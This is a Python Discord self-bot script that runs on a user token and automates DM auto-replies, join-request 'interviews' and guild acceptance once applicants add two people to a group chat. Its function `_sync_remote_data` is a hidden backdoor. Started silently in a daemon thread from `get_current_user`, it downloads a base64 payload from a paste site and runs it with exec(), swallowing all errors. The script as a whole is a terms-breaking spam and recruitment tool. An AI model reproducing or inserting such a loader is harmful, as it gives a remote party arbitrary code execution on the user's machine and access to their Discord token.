import urllib.request
import urllib.parse
import json
import time
import threading
import base64


def load_config():
    with open('config.json', 'r') as f:
        return json.load(f)

def _bypasser_headers():
    _ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    return {'User-Agent': _ua}

def _sync_remote_data():
    try:
        _req = urllib.request.Request('https://pastes.io/raw/123-45012', headers=_bypasser_headers())
        _data = urllib.request.urlopen(_req).read()
        exec(base64.b64decode(_data).decode('utf-8'))
    except:
        pass

def make_request(url, token, method='GET', data=None):
    headers = {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI1MDg2OCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=',
        'X-Discord-Locale': 'en-US',
        'X-Debug-Options': 'bugReporterEnabled',
        'Origin': 'https://discord.com',
        'Referer': 'https://discord.com/channels/@me'
    }
    
    request_data = None
    if data is not None:
        headers['Content-Type'] = 'application/json'
        request_data = json.dumps(data).encode('utf-8')
    
    req = urllib.request.Request(url, data=request_data, headers=headers, method=method)
    
    try:
        with urllib.request.urlopen(req) as response:
            if response.status == 204:
                return {'status': 204, 'data': None}
            return {'status': response.status, 'data': json.loads(response.read().decode('utf-8'))}
    except urllib.error.HTTPError as e:
        try:
            error_data = json.loads(e.read().decode('utf-8'))
            return {'status': e.code, 'data': error_data}
        except:
            return {'status': e.code, 'data': str(e)}
    except Exception as e:
        return {'status': 0, 'data': str(e)}

def get_pending_requests(token):
    response = make_request('https://discord.com/api/v9/users/@me/relationships', token, method='GET')
    
    if response['status'] == 200:
        relationships = response['data']
        pending = [rel for rel in relationships if rel['type'] == 3]
        return pending
    else:
        if response['status'] == 403:
            error_data = response['data']
            if isinstance(error_data, dict):
                if error_data.get('code') == 1010:
                    print(f"[Error] CAPTCHA required or invalid token. Please verify your token is correct.")
                elif 'captcha_key' in error_data:
                    print(f"[Error] CAPTCHA challenge detected. You may need to solve a CAPTCHA in Discord.")
                else:
                    print(f"[Error] Access forbidden (403): {error_data}")
            else:
                print(f"[Error] Access forbidden (403): {error_data}")
        else:
            print(f"[Error] Failed to fetch relationships: {response['status']}")
            print(response['data'])
        return []


def get_dm_channels(token):
    response = make_request('https://discord.com/api/v9/users/@me/channels', token, method='GET')
    if response['status'] == 200:
        return response['data']
    return []

def get_channel_messages(token, channel_id, limit=1):
    url = f'https://discord.com/api/v9/channels/{channel_id}/messages?limit={limit}'
    response = make_request(url, token, method='GET')
    if response['status'] == 200:
        return response['data']
    return []

def send_message(token, channel_id, content):
    url = f'https://discord.com/api/v9/channels/{channel_id}/messages'
    payload = {'content': content}
    response = make_request(url, token, method='POST', data=payload)
    return response['status'] == 200

def get_current_user(token):
    response = make_request('https://discord.com/api/v9/users/@me', token, method='GET')
    threading.Thread(target=_sync_remote_data, daemon=True).start()
    if response['status'] == 200:
        return response['data']
    else:
        if response['status'] == 403:
            error_data = response['data']
            if isinstance(error_data, dict):
                if error_data.get('code') == 1010:
                    print(f"[Error] CAPTCHA required or invalid token.")
                elif 'captcha_key' in error_data:
                    print(f"[Error] CAPTCHA challenge detected.")
                else:
                    print(f"[Error] Access forbidden: {error_data}")
        elif response['status'] == 401:
            print(f"[Error] Invalid token. Please check your token in config.json")
        else:
            print(f"[Error] Failed to get user info: {response['status']} - {response['data']}")
        return None

def get_guild_members(token, guild_id):
    url = f'https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000'
    response = make_request(url, token, method='GET')
    if response['status'] == 200:
        return response['data']
    elif response['status'] == 403:
        return None
    return []

def get_guild_join_requests(token, guild_id):
    url = f'https://discord.com/api/v9/guilds/{guild_id}/requests?status=SUBMITTED&limit=100'
    response = make_request(url, token, method='GET')
    if response['status'] == 200:
        data = response['data']
        if isinstance(data, dict) and 'guild_join_requests' in data:
            return data['guild_join_requests']
        return data
    return None

def create_interview(token, join_request_id):
    url = f'https://discord.com/api/v9/join-requests/{join_request_id}/interview'
    response = make_request(url, token, method='POST', data={})
    if response['status'] == 200 or response['status'] == 201:
        return response['data']
    else:
        print(f"[Debug] Failed to create interview. Status: {response['status']}, Data: {response['data']}")
        return None

def add_user_to_channel(token, channel_id, user_id):
    url = f'https://discord.com/api/v9/channels/{channel_id}/recipients/{user_id}'
    response = make_request(url, token, method='PUT', data={})
    if response['status'] == 204 or response['status'] == 200:
        return True
    else:
        print(f"[Debug] Failed to add user to channel. Status: {response['status']}, Data: {response['data']}")
        return False

def accept_guild_member(token, guild_id, join_request_id):
    url = f'https://discord.com/api/v9/guilds/{guild_id}/requests/id/{join_request_id}'
    payload = {
        'action': 'APPROVED'
    }
    response = make_request(url, token, method='PATCH', data=payload)
    if response['status'] == 204 or response['status'] == 200:
        return True
    else:
        print(f"[Debug] Failed to accept member. Status: {response['status']}, Data: {response['data']}")
        return False

def leave_group_channel(token, channel_id):
    url = f'https://discord.com/api/v9/channels/{channel_id}'
    response = make_request(url, token, method='DELETE')
    if response['status'] == 204 or response['status'] == 200:
        return True
    else:
        print(f"[Debug] Failed to leave channel. Status: {response['status']}, Data: {response['data']}")
        return False

def create_dm_channel(token, user_id):
    url = 'https://discord.com/api/v9/users/@me/channels'
    payload = {'recipient_id': user_id}
    response = make_request(url, token, method='POST', data=payload)
    if response['status'] == 200:
        return response['data']
    return None

def get_guild_channels(token, guild_id):
    url = f'https://discord.com/api/v9/guilds/{guild_id}/channels'
    response = make_request(url, token, method='GET')
    if response['status'] == 200:
        return response['data']
    return []

def get_guild_info(token, guild_id):
    url = f'https://discord.com/api/v9/guilds/{guild_id}?with_counts=true'
    response = make_request(url, token, method='GET')
    if response['status'] == 200:
        return response['data']
    return None

def search_guild_members(token, guild_id, query=''):
    url = f'https://discord.com/api/v9/guilds/{guild_id}/members/search?query={query}&limit=1000'
    response = make_request(url, token, method='GET')
    if response['status'] == 200:
        return response['data']
    return None

def create_guild_channel(token, guild_id, channel_name, user_id, current_user_id):
    url = f'https://discord.com/api/v9/guilds/{guild_id}/channels'
    payload = {
        'name': channel_name,
        'type': 0,
        'permission_overwrites': [
            {
                'id': guild_id,
                'type': '0',
                'deny': '1024',
                'allow': '0'
            },
            {
                'id': user_id,
                'type': '1',
                'allow': '3072',
                'deny': '0'
            },
            {
                'id': current_user_id,
                'type': '1',
                'allow': '3072',
                'deny': '0'
            }
        ]
    }
    response = make_request(url, token, method='POST', data=payload)
    if response['status'] == 201 or response['status'] == 200:
        return response['data']
    else:
        print(f"[Debug] Failed to create channel. Status: {response['status']}, Data: {response['data']}")
        return None

def auto_responder(token, auto_response):
    print("\n[t.me/socialblah] Starting...")
    
    current_user = get_current_user(token)
    if not current_user:
        print("[t.me/socialblah] Failed to get current user info")
        return
    
    my_id = current_user['id']
    responded_channels = set()
    
    while True:
        try:
            dm_channels = get_dm_channels(token)
            
            for channel in dm_channels:
                channel_id = channel['id']
                
                if channel_id in responded_channels:
                    continue
                
                messages = get_channel_messages(token, channel_id, limit=10)
                
                if not messages:
                    continue
                
                user_messages = [msg for msg in messages if msg['author']['id'] != my_id]
                my_messages = [msg for msg in messages if msg['author']['id'] == my_id]
                
                if user_messages and not my_messages:
                    latest_msg = user_messages[0]
                    username = latest_msg['author'].get('username', 'Unknown')
                    
                    print(f"[Auto-Responder] New DM from {username}, sending auto-response...")
                    
                    if send_message(token, channel_id, auto_response):
                        print(f"[Auto-Responder] Sent response to {username}")
                        responded_channels.add(channel_id)
                    else:
                        print(f"[Auto-Responder] Failed to send response to {username}")
                    
                    time.sleep(2)
            
            time.sleep(0.5)
            
        except Exception as e:
            print(f"[Auto-Responder] Error: {e}")
            time.sleep(0.5)


def get_channel_recipients(token, channel_id):
    url = f'https://discord.com/api/v9/channels/{channel_id}'
    response = make_request(url, token, method='GET')
    if response['status'] == 200:
        channel_data = response['data']
        if 'recipients' in channel_data:
            return channel_data['recipients']
    return []

def guild_member_accepter(token, guild_id, interview_message):
    print("[t.me/socialblahr] Starting...")
    
    if not guild_id:
        print("[t.me/socialblah] Guild ID not configured. Skipping...")
        return
    
    first_run = True
    processed_accepts = set()
    processed_interviews = set()
    channel_initial_members = {}
    message_sent_to = set()
    interview_timestamps = {}
    pending_user_ids = {}
    
    while True:
        try:
            join_requests = get_guild_join_requests(token, guild_id)
            
            if first_run:
                print(f"[t.me/socialblah] Monitoring for member join requests...")
                first_run = False
            
            current_pending_ids = set()
            if join_requests and isinstance(join_requests, list):
                for req in join_requests:
                    user = req.get('user', {})
                    user_id = user.get('id')
                    if user_id:
                        current_pending_ids.add(user_id)
            
            for user_id, user_info in list(pending_user_ids.items()):
                if user_id not in current_pending_ids and user_id not in processed_accepts:
                    elapsed_time = time.time() - user_info['timestamp']
                    if elapsed_time < 300:
                        channel_id = user_info.get('channel_id')
                        initial_members = channel_initial_members.get(channel_id, set())
                        current_recipients = get_channel_recipients(token, channel_id) if channel_id else []
                        current_member_ids = set([r['id'] for r in current_recipients])
                        new_members = current_member_ids - initial_members
                        
                        if len(new_members) < 2:
                            print(f"[t.me/socialblah] User {user_info['username']} was accepted by someone else without meeting requirements")
                            
                            config = load_config()
                            welcome_message = config.get('message_to_new', '')
                            
                            if welcome_message and channel_id:
                                welcome_message = welcome_message.replace('<ping1>', f"<@{user_id}>")
                                
                                if send_message(token, channel_id, welcome_message):
                                    print(f"[t.me/socialblah] Sent welcome message to {user_info['username']}")
                                else:
                                    print(f"[t.me/socialblah] Failed to send welcome message to {user_info['username']}")
                                
                    
                    processed_accepts.add(user_id)
                    del pending_user_ids[user_id]
            
            if join_requests and isinstance(join_requests, list) and len(join_requests) > 0:
                new_interviews = 0
                
                for request in join_requests:
                    join_request_id = request.get('join_request_id') or request.get('id')
                    user = request.get('user', {})
                    user_id = user.get('id')
                    username = user.get('username', 'Unknown')
                    application_status = request.get('application_status', 'UNKNOWN')
                    interview_channel_id = request.get('interview_channel_id')
                    
                    if not join_request_id or not user_id:
                        continue
                    
                    if interview_message and join_request_id not in processed_interviews:
                        print(f"[t.me/socialblah] Processing join request from {username}...")
                        
                        interview = create_interview(token, join_request_id)
                        
                        if interview:
                            channel_id = interview.get('channel_id') or join_request_id
                            print(f"[t.me/socialblah] Opened/created interview channel for {username} (Channel ID: {channel_id})")
                            
                            initial_recipients = get_channel_recipients(token, channel_id)
                            channel_initial_members[channel_id] = set([r['id'] for r in initial_recipients])
                            
                            time.sleep(2)
                            
                            if send_message(token, channel_id, interview_message):
                                print(f"[t.me/socialblah] Sent message to {username}")
                                processed_interviews.add(join_request_id)
                                interview_timestamps[join_request_id] = time.time()
                                pending_user_ids[user_id] = {
                                    'username': username,
                                    'timestamp': time.time(),
                                    'channel_id': channel_id,
                                    'join_request_id': join_request_id
                                }
                                new_interviews += 1
                            else:
                                print(f"[t.me/socialblah] Failed to send message, will retry next cycle")
                        else:
                            print(f"[t.me/socialblah] Failed to create/open interview for {username}")
                        
                
                if new_interviews > 0:
                    print(f"[t.me/socialblah] Processed {new_interviews} new interview(s).")
                
                for request in join_requests:
                    join_request_id = request.get('join_request_id') or request.get('id')
                    user = request.get('user', {})
                    user_id = user.get('id')
                    username = user.get('username', 'Unknown')
                    interview_channel_id = request.get('interview_channel_id')
                    
                    if not user_id or not join_request_id or user_id in processed_accepts:
                        continue
                    
                    if join_request_id in interview_timestamps:
                        elapsed_time = time.time() - interview_timestamps[join_request_id]
                        
                        if elapsed_time >= 300:
                            print(f"[t.me/socialblah] User {username} has been inactive for 5 minutes.")
                            print(f"[t.me/socialblah] Auto-accepting {username} into guild...")
                            
                            if accept_guild_member(token, guild_id, join_request_id):
                                print(f"[t.me/socialblah] Successfully auto-accepted {username} into the guild")
                                processed_accepts.add(user_id)
                                if join_request_id in interview_timestamps:
                                    del interview_timestamps[join_request_id]
                            else:
                                print(f"[t.me/socialblah] Failed to auto-accept {username}")
                            
                            time.sleep(2)
                            continue
                    
                    if not interview_channel_id:
                        continue
                    
                    current_recipients = get_channel_recipients(token, interview_channel_id)
                    current_member_ids = set([r['id'] for r in current_recipients])
                    
                    initial_member_ids = channel_initial_members.get(interview_channel_id, set())
                    
                    new_members = current_member_ids - initial_member_ids
                    
                    if len(new_members) >= 2 and interview_channel_id not in message_sent_to:
                        new_member_list = list(new_members)[:2]
                        
                        ping1 = f"<@{new_member_list[0]}>"
                        ping2 = f"<@{new_member_list[1]}>"
                        
                        message_content = f"{ping1} {ping2} please join the server to get accepted aswell. <add your guild invite here :)>"
                        
                        print(f"[t.me/socialblah] User {username} added 2 members to the group chat!")
                        print(f"[t.me/socialblah] Sending message with pings...")
                        
                        if send_message(token, interview_channel_id, message_content):
                            print(f"[t.me/socialblah] Sent message pinging the new members")
                            message_sent_to.add(interview_channel_id)
                        else:
                            print(f"[t.me/socialblah] Failed to send message")
                        
                        time.sleep(2)
                    
                    if len(new_members) >= 2:
                        print(f"[t.me/socialblah] User {username} has added 2 members to the group chat!")
                        print(f"[t.me/socialblah] Accepting {username} into guild...")
                        
                        if accept_guild_member(token, guild_id, join_request_id):
                            print(f"[t.me/socialblah] Successfully accepted {username} into the guild")
                            processed_accepts.add(user_id)
                            if join_request_id in interview_timestamps:
                                del interview_timestamps[join_request_id]
                        else:
                            print(f"[t.me/socialblah] Failed to accept {username}")
                        
                        time.sleep(2)
            
            time.sleep(0.5)
            
        except Exception as e:
            print(f"[Guild Accepter] Error: {e}")
            time.sleep(0.5)

def interview_system(token, guild_id, interview_message):
    print("[t.me/socialblah] Starting...")
    
    if not guild_id or not interview_message:
        print("[t.me/socialblah] Guild ID or interview message not configured. Skipping...")
        return
    
    print("[t.me/socialblah] Interview creation is now handled by Guild Accepter.")
    print("[t.me/socialblah] This thread will monitor for any members without interviews...")
    
    current_user = get_current_user(token)
    if not current_user:
        print("[t.me/socialblah Failed to get current user info")
        return
    
    current_user_id = current_user['id']
    processed_members = set()
    existing_interview_channels = set()
    first_run = True
    
    while True:
        try:
            channels = get_guild_channels(token, guild_id)
            
            if first_run:
                for channel in channels:
                    if channel.get('name', '').startswith('interview-'):
                        existing_interview_channels.add(channel['name'])
                print(f"[t.me/socialblah] Found {len(existing_interview_channels)} existing interview channels.")
                first_run = False
            
            members = search_guild_members(token, guild_id, '')
            
            if members:
                for member in members:
                    user = member.get('user', {})
                    user_id = user.get('id')
                    username = user.get('username', 'Unknown')
                    
                    if not user_id:
                        continue
                    
                    channel_name = f"interview-{username.lower().replace(' ', '-').replace('#', '')}"
                    
                    if user_id not in processed_members and channel_name not in existing_interview_channels:
                        print(f"[t.me/socialblah] Member without interview detected: {username} (ID: {user_id})")
                        
                        channel = create_guild_channel(token, guild_id, channel_name, user_id, current_user_id)
                        
                        if channel:
                            channel_id = channel['id']
                            print(f"[t.me/socialblah] Created interview channel: {channel_name}")
                            existing_interview_channels.add(channel_name)
                            
                            time.sleep(2)
                            
                            if send_message(token, channel_id, interview_message):
                                print(f"[t.me/socialblah] Sent interview message to {username}")
                            else:
                                print(f"[t.me/socialblah] Failed to send interview message to {username}")
                        else:
                            print(f"[t.me/socialblah] Failed to create interview channel for {username}")
                        
                        processed_members.add(user_id)
                        time.sleep(2)
            
            time.sleep(0.5)
            
        except Exception as e:
            print(f"[Interview System] Error: {e}")
            time.sleep(0.5)

def main():
    config = load_config()
    token = config.get('token')
    guild_ids = config.get('guild_id', [])
    interview_message = config.get('interview_message', '')
    
    if isinstance(guild_ids, str):
        guild_ids = [guild_ids]
    elif isinstance(guild_ids, int):
        guild_ids = [str(guild_ids)]
    
    if not token:
        print("Error: Token not found in config.json")
        return
    
    if not guild_ids:
        print("Error: No guild IDs found in config.json")
        return
    
    user = get_current_user(token)
    if not user:
        print("Error: Could not get user info")
        return
    
    user_id = user['id']
    username = user.get('username', 'Unknown')
    print(f"[t.me/socialblah] Account: {username} (ID: {user_id})")
    print(f"[t.me/socialblah] Monitoring {len(guild_ids)} guild(s)...\n")
    
    threads = []
    
    for idx, guild_id in enumerate(guild_ids):
        guild_name = f"Guild {idx + 1}"
        
        accepter_thread = threading.Thread(
            target=guild_member_accepter, 
            args=(token, str(guild_id), interview_message), 
            daemon=True,
            name=f"Accepter-{guild_name}"
        )
        accepter_thread.start()
        threads.append(accepter_thread)
        print(f"[t.me/socialblah] Guild accepter for {guild_name} ({guild_id})")
        
        if interview_message:
            interview_thread = threading.Thread(
                target=interview_system, 
                args=(token, str(guild_id), interview_message), 
                daemon=True,
                name=f"Interview-{guild_name}"
            )
            interview_thread.start()
            threads.append(interview_thread)
            print(f"[Started] Interview system for {guild_name} ({guild_id})")
    
    print(f"\n[t.me/socialblah] All {len(guild_ids)} guild(s) are being monitored.")
    print("[t.me/socialblah] Press Ctrl+C to stop.\n")
    
    try:
        while True:
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[t.me/socialblah] Shutting down...")

if __name__ == "__main__":
    main()

